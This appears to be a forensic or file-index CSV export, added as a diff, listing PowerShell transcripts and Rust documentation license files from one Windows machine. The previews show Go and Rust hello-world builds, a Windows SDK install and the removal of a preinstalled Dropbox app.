+Host Application: PowerShell.exe -noexit -command Set-Location -literalPath 'C:\Projects\ProjectC'
+Process ID: 3128
+PSVersion: 5.1.16299.251
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
+BuildVersion: 10.0.16299.251
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>Set-Location -literalPath 'C:\Projects\ProjectC'
+","09/04/2018 18:02:25.3432268","0,03125","file","22B3CBF0E27513B7","804cb650-0000-0000-0000-501f00000000","Text Document","2439"
+"E3E9CAF4C914A2CE76039826E842FA89","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.iHM30LIe.20180411092543.txt","1658","Archive (32)","11/04/2018 15:27:57.6174951","11/04/2018 15:25:43.9620509","11/04/2018 15:25:43.9620509","file:C:/Users/maxpowers/Documents/20180411/PowerShell_transcript.DESKTOP-EDSLQM8.iHM30LIe.20180411092543.txt","20180411","DESKTOP-EDSLQM8","text/plain","11/04/2018 15:25:44.0000000","11/04/2018 15:25:44.0000000","11/04/2018 15:27:57.6174951",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","11/04/2018 15:27:57.6174951","C:\Users\maxpowers\Documents\20180411","20180411 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.iHM30LIe.20180411092543.txt","PowerShell_transcript.DESKTOP-EDSLQM8.iHM30LIe.20180411092543.txt","PowerShell_transcript.DESKTOP-EDSLQM8.iHM30LIe.20180411092543","C:\Users\maxpowers\Documents\20180411\PowerShell_transcript.DESKTOP-EDSLQM8.iHM30LIe.20180411092543.txt","PowerShell_transcript.DESKTOP-EDSLQM8.iHM30LIe.20180411092543 (C:\Users\maxpowers\Documents\20180411)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.iHM30LIe.20180411092543.txt","1077936503","0","**********************
+Windows PowerShell transcript start
+Start time: 20180411092543
+Username: DESKTOP-EDSLQM8\maxpowers
+RunAs User: DESKTOP-EDSLQM8\maxpowers
+Configuration Name: 
+Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
+Host Application: PowerShell.exe -noexit -command Set-Location -literalPath 'C:\Users\maxpowers\Documents\stuff'
+Process ID: 6936
+PSVersion: 5.1.16299.251
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
+BuildVersion: 10.0.16299.251
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>Set-Location -literalPath 'C:\Users\maxpowers\Documents\stuff'
+PS C:\Users\maxpowers\Documents\stuff> go build
+
+PS C:\Users\maxpowers\Documents\stuff> go build .\tg.go
+
+PS C:\Users\maxpowers\Documents\stuff> .\tg.exe
+hello, world
+PS C:\Users\maxpowers\Documents\stuff> .\tg.exe
+hello, world
+PS C:\Users\maxpowers\Documents\stuff> .\tg.exe
+hello, world","11/04/2018 15:28:02.5705864","0,03125","file","6A796D605293CE8E","804cb650-0000-0000-0000-501f00000000","Text Document","2451"
+"44CA455EB5E5A0677F14E3A8D941729D","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.c4Lp9zwb.20180411093811.txt","3048","Archive (32)","11/04/2018 15:42:55.2738067","11/04/2018 15:38:12.3206043","11/04/2018 15:38:12.3206043","file:C:/Users/maxpowers/Documents/20180411/PowerShell_transcript.DESKTOP-EDSLQM8.c4Lp9zwb.20180411093811.txt","20180411","DESKTOP-EDSLQM8","text/plain","11/04/2018 15:38:14.0000000","11/04/2018 15:38:14.0000000","11/04/2018 15:42:55.2738067",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","11/04/2018 15:42:55.2738067","C:\Users\maxpowers\Documents\20180411","20180411 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.c4Lp9zwb.20180411093811.txt","PowerShell_transcript.DESKTOP-EDSLQM8.c4Lp9zwb.20180411093811.txt","PowerShell_transcript.DESKTOP-EDSLQM8.c4Lp9zwb.20180411093811","C:\Users\maxpowers\Documents\20180411\PowerShell_transcript.DESKTOP-EDSLQM8.c4Lp9zwb.20180411093811.txt","PowerShell_transcript.DESKTOP-EDSLQM8.c4Lp9zwb.20180411093811 (C:\Users\maxpowers\Documents\20180411)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.c4Lp9zwb.20180411093811.txt","1077936503","0","**********************
+Windows PowerShell transcript start
+Start time: 20180411093812
+Username: DESKTOP-EDSLQM8\maxpowers
+RunAs User: DESKTOP-EDSLQM8\maxpowers
+Configuration Name: 
+Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
+Host Application: c:\windows\syswow64\\windowspowershell\v1.0\powershell.exe -NonInteractive -NoLogo -NoProfile -ExecutionPolicy Bypass -InputFormat None $ErrorActionPreference=""Stop""; $VerbosePreference=""Continue""; $CeipSetting=""on""; $ScriptPath=""C:\ProgramData\Microsoft\VisualStudio\Packages\Win10SDK_10.0.16299,version=10.0.16299.2\WinSdkInstall.ps1""; $SetupExe=""winsdksetup.exe""; $SetupLogFolder=""windowssdk""; $PackageId=""Win10SDK_10.0.16299""; $LogFile=""C:\Users\maxpowers\AppData\Local\Temp\dd_setup_20180411093437_079_Win10SDK_10.0.16299.log""; $SetupParameters=""/features OptionId.AvrfExternal OptionId.UWPManaged OptionId.WindowsSoftwareLogoToolkit OptionId.SigningTools OptionId.UWPLocalized OptionId.UWPCPP OptionId.DesktopCPPx64 OptionId.DesktopCPPx86 OptionID.Des","11/04/2018 15:42:56.1594176","0,0625","file","4B265C12C52CE61C","804cb650-0000-0000-0000-501f00000000","Text Document","2489"
+"561E3BF02BF80FF5DD6AE979594A76EE","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.tton8k9I.20180426123242.txt","868","Archive (32)","26/04/2018 18:32:43.5952724","26/04/2018 18:32:42.3352156","26/04/2018 18:32:42.3352156","file:C:/Users/itsupport/Documents/20180426/PowerShell_transcript.DESKTOP-EDSLQM8.tton8k9I.20180426123242.txt","20180426","DESKTOP-EDSLQM8","text/plain","26/04/2018 18:32:43.5952724","26/04/2018 18:32:43.5952724","26/04/2018 18:32:43.5952724",".txt","DESKTOP-EDSLQM8\itsupport","6","False","False","False","26/04/2018 18:32:43.5952724","C:\Users\itsupport\Documents\20180426","20180426 (C:\Users\itsupport\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.tton8k9I.20180426123242.txt","PowerShell_transcript.DESKTOP-EDSLQM8.tton8k9I.20180426123242.txt","PowerShell_transcript.DESKTOP-EDSLQM8.tton8k9I.20180426123242","C:\Users\itsupport\Documents\20180426\PowerShell_transcript.DESKTOP-EDSLQM8.tton8k9I.20180426123242.txt","PowerShell_transcript.DESKTOP-EDSLQM8.tton8k9I.20180426123242 (C:\Users\itsupport\Documents\20180426)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.tton8k9I.20180426123242.txt","1077936503","0","**********************
+Windows PowerShell transcript start
+Start time: 20180426123242
+Username: DESKTOP-EDSLQM8\itsupport
+RunAs User: DESKTOP-EDSLQM8\itsupport
+Configuration Name: 
+Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
+Host Application: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell Get-AppxPackage C27EB4BA.DropboxOEM | Remove-AppxPackage
+Process ID: 7844
+PSVersion: 5.1.16299.251
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
+BuildVersion: 10.0.16299.251
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>Get-AppxPackage C27EB4BA.DropboxOEM | Remove-AppxPackage
+PS>$global:?
+True
+**********************
+Windows PowerShell transcript end
+End time: 20180426123243
+**********************
+","26/04/2018 18:32:44.3640053","0","file","E8C304CA99A5E40B","804cb650-0000-0000-0000-501f00000000","Text Document","2911"
+"882A0F70E5AF1A0F70A7471E535667A2","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.s+KGHmnY.20180426123244.txt","1010","Archive (32)","26/04/2018 18:32:47.6086819","26/04/2018 18:32:44.7034155","26/04/2018 18:32:44.7034155","file:C:/Users/itsupport/Documents/20180426/PowerShell_transcript.DESKTOP-EDSLQM8.s+KGHmnY.20180426123244.txt","20180426","DESKTOP-EDSLQM8","text/plain","26/04/2018 18:32:46.0000000","26/04/2018 18:32:46.0000000","26/04/2018 18:32:47.6086819",".txt","DESKTOP-EDSLQM8\itsupport","6","False","False","False","26/04/2018 18:32:47.6086819","C:\Users\itsupport\Documents\20180426","20180426 (C:\Users\itsupport\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.s+KGHmnY.20180426123244.txt","PowerShell_transcript.DESKTOP-EDSLQM8.s+KGHmnY.20180426123244.txt","PowerShell_transcript.DESKTOP-EDSLQM8.s+KGHmnY.20180426123244","C:\Users\itsupport\Documents\20180426\PowerShell_transcript.DESKTOP-EDSLQM8.s+KGHmnY.20180426123244.txt","PowerShell_transcript.DESKTOP-EDSLQM8.s+KGHmnY.20180426123244 (C:\Users\itsupport\Documents\20180426)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.s+KGHmnY.20180426123244.txt","1077936503","0","**********************
+Windows PowerShell transcript start
+Start time: 20180426123244
+Username: DESKTOP-EDSLQM8\itsupport
+RunAs User: DESKTOP-EDSLQM8\itsupport
+Configuration Name: 
+Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
+Host Application: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell Get-AppxProvisionedPackage -Online | Where-Object DisplayName -In ""C27EB4BA.DropboxOEM"" | Remove-ProvisionedAppxPackage -Online
+Process ID: 4664
+PSVersion: 5.1.16299.251
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
+BuildVersion: 10.0.16299.251
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>Get-AppxProvisionedPackage -Online | Where-Object DisplayName -In ""C27EB4BA.DropboxOEM"" | Remove-ProvisionedAppxPackage -Online
+PS>$global:?
+True
+**********************
+Windows PowerShell transcript end
+End time: 20180426123247
+**********************
+","26/04/2018 18:32:47.6243054","0,015625","file","F6FAE9E6526FE05F","804cb650-0000-0000-0000-501f00000000","Text Document","2912"
+"D1E9AA888D79D0FC56A9205173FF814C","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.WG3omz0G.20180411102623.txt","807","Archive (32)","11/04/2018 16:26:30.9618685","11/04/2018 16:26:23.6336843","11/04/2018 16:26:23.6336843","file:C:/Users/maxpowers/Documents/20180411/PowerShell_transcript.DESKTOP-EDSLQM8.WG3omz0G.20180411102623.txt","20180411","DESKTOP-EDSLQM8","text/plain","11/04/2018 16:26:24.0000000","11/04/2018 16:26:24.0000000","11/04/2018 16:26:30.9618685",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","11/04/2018 16:26:30.9618685","C:\Users\maxpowers\Documents\20180411","20180411 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.WG3omz0G.20180411102623.txt","PowerShell_transcript.DESKTOP-EDSLQM8.WG3omz0G.20180411102623.txt","PowerShell_transcript.DESKTOP-EDSLQM8.WG3omz0G.20180411102623","C:\Users\maxpowers\Documents\20180411\PowerShell_transcript.DESKTOP-EDSLQM8.WG3omz0G.20180411102623.txt","PowerShell_transcript.DESKTOP-EDSLQM8.WG3omz0G.20180411102623 (C:\Users\maxpowers\Documents\20180411)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.WG3omz0G.20180411102623.txt","1077936503","0","**********************
+Windows PowerShell transcript start
+Start time: 20180411102623
+Username: DESKTOP-EDSLQM8\maxpowers
+RunAs User: DESKTOP-EDSLQM8\maxpowers
+Configuration Name: 
+Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
+Host Application: PowerShell.exe -noexit -command Set-Location -literalPath 'C:\Users\maxpowers\Documents\stuff\rust'
+Process ID: 4012
+PSVersion: 5.1.16299.251
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
+BuildVersion: 10.0.16299.251
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>Set-Location -literalPath 'C:\Users\maxpowers\Documents\stuff\rust'
+PS C:\Users\maxpowers\Documents\stuff\rust> .\rt.exe
+Hello World!
+","11/04/2018 16:26:51.3992503","0,078125","file","3B15AD8D4C1C4AF6","804cb650-0000-0000-0000-501f00000000","Text Document","3375"
+"7E11908960A94C3030A63BBB1B5D068B","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.2MQkrO0C.20180411102114.txt","6725","Archive (32)","11/04/2018 16:25:02.3837464","11/04/2018 16:21:14.1805974","11/04/2018 16:21:14.1805974","file:C:/Users/maxpowers/Documents/20180411/PowerShell_transcript.DESKTOP-EDSLQM8.2MQkrO0C.20180411102114.txt","20180411","DESKTOP-EDSLQM8","text/plain","11/04/2018 16:21:16.0000000","11/04/2018 16:21:16.0000000","11/04/2018 16:25:02.3837464",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","11/04/2018 16:25:02.3837464","C:\Users\maxpowers\Documents\20180411","20180411 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.2MQkrO0C.20180411102114.txt","PowerShell_transcript.DESKTOP-EDSLQM8.2MQkrO0C.20180411102114.txt","PowerShell_transcript.DESKTOP-EDSLQM8.2MQkrO0C.20180411102114","C:\Users\maxpowers\Documents\20180411\PowerShell_transcript.DESKTOP-EDSLQM8.2MQkrO0C.20180411102114.txt","PowerShell_transcript.DESKTOP-EDSLQM8.2MQkrO0C.20180411102114 (C:\Users\maxpowers\Documents\20180411)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.2MQkrO0C.20180411102114.txt","1077936503","0","**********************
+Windows PowerShell transcript start
+Start time: 20180411102114
+Username: DESKTOP-EDSLQM8\maxpowers
+RunAs User: DESKTOP-EDSLQM8\maxpowers
+Configuration Name: 
+Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
+Host Application: PowerShell.exe -noexit -command Set-Location -literalPath 'C:\Users\maxpowers\Documents\stuff\rust'
+Process ID: 5836
+PSVersion: 5.1.16299.251
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
+BuildVersion: 10.0.16299.251
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>Set-Location -literalPath 'C:\Users\maxpowers\Documents\stuff\rust'
+PS C:\Users\maxpowers\Documents\stuff\rust> rustc .\rt.rs
+error[E0601]: main function not found
+
+error: aborting due to previous error
+PS C:\Users\maxpowers\Documents\stuff\rust> rustc .\rt.rs --release
+error: Unrecognized option: 'release'
+PS C:\Users\maxpowers\Documents\stuff\rus","11/04/2018 16:26:54.7429963","0","file","BEDC082D5DDF338F","804cb650-0000-0000-0000-501f00000000","Text Document","3376"
+"1EF280A37FBED7889171636A7E43836D","140015124E12","COPYRIGHT.txt","2310","Archive (32)","25/03/2018 15:49:41.0000000","11/04/2018 16:12:50.2898649","11/04/2018 16:12:50.2898649","file:C:/Users/maxpowers/.rustup/toolchains/stable-x86_64-pc-windows-msvc/share/doc/rust/html/COPYRIGHT.txt","html","DESKTOP-EDSLQM8","text/plain","25/03/2018 15:49:41.0000000","25/03/2018 15:49:41.0000000","25/03/2018 15:49:41.0000000",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","25/03/2018 15:49:41.0000000","C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html","html (C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust)","COPYRIGHT.txt","COPYRIGHT.txt","COPYRIGHT","C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html\COPYRIGHT.txt","COPYRIGHT (C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html)",".txt","document","Document","text/plain","False","COPYRIGHT.txt","1077936503","0","These documentation pages include resources by third parties. This copyright
+file applies only to those resources. The following third party resources are
+included, and carry their own copyright notices and license terms:
+
+* Fira Sans (FiraSans-Regular.woff, FiraSans-Medium.woff):
+
+    Copyright (c) 2014, Mozilla Foundation https://mozilla.org/
+    with Reserved Font Name Fira Sans.
+
+    Copyright (c) 2014, Telefonica S.A.
+
+    Licensed under the SIL Open Font License, Version 1.1.
+    See FiraSans-LICENSE.txt.
+
+* Heuristica (Heuristica-Italic.woff):
+
+    Copyright 1989, 1991 Adobe Systems Incorporated. All rights reserved.
+    Utopia is either a registered trademark or trademark of Adobe Systems
+    Incorporated in the United States and/or other countries. Used under
+    license.
+
+    Copyright 2006 Han The Thanh, Vntopia font family, http://vntex.sf.net
+
+    Copyright (c) 2008-2012, Andrey V. Panov (panov@canopus.iacp.dvo.ru),
+    with Reserved Font Name Heuristica.
+
+    Licensed under the SIL Open Font Lic","11/04/2018 16:15:57.6806450","0,015625","file","FD4E177B2BC5A522","804cb650-0000-0000-0000-501f00000000","Text Document","10185"
+"8D4DECB56109596A4655E97CAE72E98B","140015124E12","FiraSans-LICENSE.txt","4530","Archive (32)","25/03/2018 15:49:41.0000000","11/04/2018 16:13:00.7898424","11/04/2018 16:13:00.7898424","file:C:/Users/maxpowers/.rustup/toolchains/stable-x86_64-pc-windows-msvc/share/doc/rust/html/FiraSans-LICENSE.txt","html","DESKTOP-EDSLQM8","text/plain","25/03/2018 15:49:41.0000000","25/03/2018 15:49:41.0000000","25/03/2018 15:49:41.0000000",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","25/03/2018 15:49:41.0000000","C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html","html (C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust)","FiraSans-LICENSE.txt","FiraSans-LICENSE.txt","FiraSans-LICENSE","C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html\FiraSans-LICENSE.txt","FiraSans-LICENSE (C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html)",".txt","document","Document","text/plain","False","FiraSans-LICENSE.txt","1077936503","0","Copyright (c) 2014, Mozilla Foundation https://mozilla.org/
+with Reserved Font Name Fira Sans.
+
+Copyright (c) 2014, Mozilla Foundation https://mozilla.org/
+with Reserved Font Name Fira Mono.
+
+Copyright (c) 2014, Telefonica S.A.
+
+This Font Software is licensed under the SIL Open Font License, Version 1.1.
+This license is copied below, and is also available with a FAQ at:
+http://scripts.sil.org/OFL
+
+
+-----------------------------------------------------------
+SIL OPEN FONT LICENSE Version 1.1 - 26 February 2007
+-----------------------------------------------------------
+
+PREAMBLE
+The goals of the Open Font License (OFL) are to stimulate worldwide
+development of collaborative font projects, to support the font creation
+efforts of academic and linguistic communities, and to provide a free and
+open framework in which fonts may be shared and improved in partnership
+with others.
+
+The OFL allows the licensed fonts to be used, studied, modified and
+redistributed freely as long as they are not sold by themselves. The
+f","11/04/2018 16:15:36.6182933","0","file","3D5C8EE248AD2594","804cb650-0000-0000-0000-501f00000000","Text Document","11702"
+"96FABA4AC416899B2C5F8F2CB129FDF3","140015124E12","Heuristica-LICENSE.txt","4699","Archive (32)","25/03/2018 15:49:41.0000000","11/04/2018 16:13:00.9305246","11/04/2018 16:13:00.9305246","file:C:/Users/maxpowers/.rustup/toolchains/stable-x86_64-pc-windows-msvc/share/doc/rust/html/Heuristica-LICENSE.txt","html","DESKTOP-EDSLQM8","text/plain","25/03/2018 15:49:41.0000000","25/03/2018 15:49:41.0000000","25/03/2018 15:49:41.0000000",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","25/03/2018 15:49:41.0000000","C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html","html (C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust)","Heuristica-LICENSE.txt","Heuristica-LICENSE.txt","Heuristica-LICENSE","C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html\Heuristica-LICENSE.txt","Heuristica-LICENSE (C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html)",".txt","document","Document","text/plain","False","Heuristica-LICENSE.txt","1077936503","0","Copyright 1989, 1991 Adobe Systems Incorporated. All rights reserved.
+Utopia is either a registered trademark or trademark of Adobe Systems
+Incorporated in the United States and/or other countries. Used under
+license.
+
+Copyright 2006 Han The Thanh, Vntopia font family, http://vntex.sf.net
+
+Copyright (c) 2008-2012, Andrey V. Panov (panov@canopus.iacp.dvo.ru),
+with Reserved Font Name Heuristica.
+
+This Font Software is licensed under the SIL Open Font License, Version 1.1.
+This license is copied below, and is also available with a FAQ at:
+http://scripts.sil.org/OFL
+
+
+-----------------------------------------------------------
+SIL OPEN FONT LICENSE Version 1.1 - 26 February 2007
+-----------------------------------------------------------
+
+PREAMBLE
+The goals of the Open Font License (OFL) are to stimulate worldwide
+development of collaborative font projects, to support the font creation
+efforts of academic and linguistic communities, and to provide a free and
+open framework in which fonts may be shared and improve","11/04/2018 16:15:36.4461007","0","file","4A3B58E4E1DB675A","804cb650-0000-0000-0000-501f00000000","Text Document","11719"
+"B5B4525D8860F283973F87990FAE7277","140015124E12","LICENSE-APACHE.txt","10847","Archive (32)","25/03/2018 15:49:41.0000000","11/04/2018 16:13:02.9148575","11/04/2018 16:13:02.9148575","file:C:/Users/maxpowers/.rustup/toolchains/stable-x86_64-pc-windows-msvc/share/doc/rust/html/LICENSE-APACHE.txt","html","DESKTOP-EDSLQM8","text/plain","25/03/2018 15:49:41.0000000","25/03/2018 15:49:41.0000000","25/03/2018 15:49:41.0000000",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","25/03/2018 15:49:41.0000000","C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html","html (C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust)","LICENSE-APACHE.txt","LICENSE-APACHE.txt","LICENSE-APACHE","C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html\LICENSE-APACHE.txt","LICENSE-APACHE (C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html)",".txt","document","Document","text/plain","False","LICENSE-APACHE.txt","1077936503","0","Apache License
+                        Version 2.0, January 2004
+                     http://www.apache.org/licenses/
+
+TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION
+
+1. Definitions.
+
+   ""License"" shall mean the terms and conditions for use, reproduction,
+   and distribution as defined by Sections 1 through 9 of this document.
+
+   ""Licensor"" shall mean the copyright owner or entity authorized by
+   the copyright owner that is granting the License.
+
+   ""Legal Entity"" shall mean the union of the acting entity and all
+   other entities that control, are controlled by, or are under common
+   control with that entity. For the purposes of this definition,
+   ""control"" means (i) the power, direct or indirect, to cause the
+   direction or management of such entity, whether by contract or
+   otherwise, or (ii) ownership of fifty percent (50%) or more of the
+   outstanding shares, or (iii) beneficial ownership of such entity.
+
+   ""You"" (or ""Your"") shall mean an individual or Legal Entity
+   exercising per","11/04/2018 16:15:34.1336040","0,015625","file","98BAA1BC4CCC4C00","804cb650-0000-0000-0000-501f00000000","Text Document","12067"
+"D64E7A367667B617B73932B3F286C415","140015124E12","LICENSE-MIT.txt","1023","Archive (32)","25/03/2018 15:49:41.0000000","11/04/2018 16:13:02.9148575","11/04/2018 16:13:02.9148575","file:C:/Users/maxpowers/.rustup/toolchains/stable-x86_64-pc-windows-msvc/share/doc/rust/html/LICENSE-MIT.txt","html","DESKTOP-EDSLQM8","text/plain","25/03/2018 15:49:41.0000000","25/03/2018 15:49:41.0000000","25/03/2018 15:49:41.0000000",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","25/03/2018 15:49:41.0000000","C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html","html (C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust)","LICENSE-MIT.txt","LICENSE-MIT.txt","LICENSE-MIT","C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html\LICENSE-MIT.txt","LICENSE-MIT (C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html)",".txt","document","Document","text/plain","False","LICENSE-MIT.txt","1077936503","0","Permission is hereby granted, free of charge, to any
+person obtaining a copy of this software and associated
+documentation files (the ""Software""), to deal in the
+Software without restriction, including without
+limitation the rights to use, copy, modify, merge,
+publish, distribute, sublicense, and/or sell copies of
+the Software, and to permit persons to whom the Software
+is furnished to do so, subject to the following
+conditions:
+
+The above copyright notice and this permission notice
+shall be included in all copies or substantial portions
+of the Software.
+
+THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF
+ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED
+TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A
+PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT
+SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
+CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION
+OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR
+IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
+DEALINGS IN THE SOFTWARE.
+","11/04/2018 16:15:34.1181330","0","file","E9807FE929745C8B","804cb650-0000-0000-0000-501f00000000","Text Document","12068"
+"51479604690A37443662ADF5A36AF8BD","140015124E12","SourceCodePro-LICENSE.txt","4528","Archive (32)","25/03/2018 15:49:41.0000000","11/04/2018 16:13:06.0867296","11/04/2018 16:13:06.0867296","file:C:/Users/maxpowers/.rustup/toolchains/stable-x86_64-pc-windows-msvc/share/doc/rust/html/SourceCodePro-LICENSE.txt","html","DESKTOP-EDSLQM8","text/plain","25/03/2018 15:49:41.0000000","25/03/2018 15:49:41.0000000","25/03/2018 15:49:41.0000000",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","25/03/2018 15:49:41.0000000","C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html","html (C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust)","SourceCodePro-LICENSE.txt","SourceCodePro-LICENSE.txt","SourceCodePro-LICENSE","C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html\SourceCodePro-LICENSE.txt","SourceCodePro-LICENSE (C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html)",".txt","document","Document","text/plain","False","SourceCodePro-LICENSE.txt","1077936503","0","Copyright 2010, 2012 Adobe Systems Incorporated (http://www.adobe.com/), with Reserved Font Name 'Source'. All Rights Reserved. Source is a trademark of Adobe Systems Incorporated in the United States and/or other countries.
+
+This Font Software is licensed under the SIL Open Font License, Version 1.1.
+
+This license is copied below, and is also available with a FAQ at: http://scripts.sil.org/OFL
+
+
+-----------------------------------------------------------
+SIL OPEN FONT LICENSE Version 1.1 - 26 February 2007
+-----------------------------------------------------------
+
+PREAMBLE
+The goals of the Open Font License (OFL) are to stimulate worldwide
+development of collaborative font projects, to support the font creation
+efforts of academic and linguistic communities, and to provide a free and
+open framework in which fonts may be shared and improved in partnership
+with others.
+
+The OFL allows the licensed fonts to be used, studied, modified and
+redistributed freely as long as they are not sold by themselves. The
+fon","11/04/2018 16:15:22.1492808","0,015625","file","8573866A1AB9FED9","804cb650-0000-0000-0000-501f00000000","Text Document","12573"
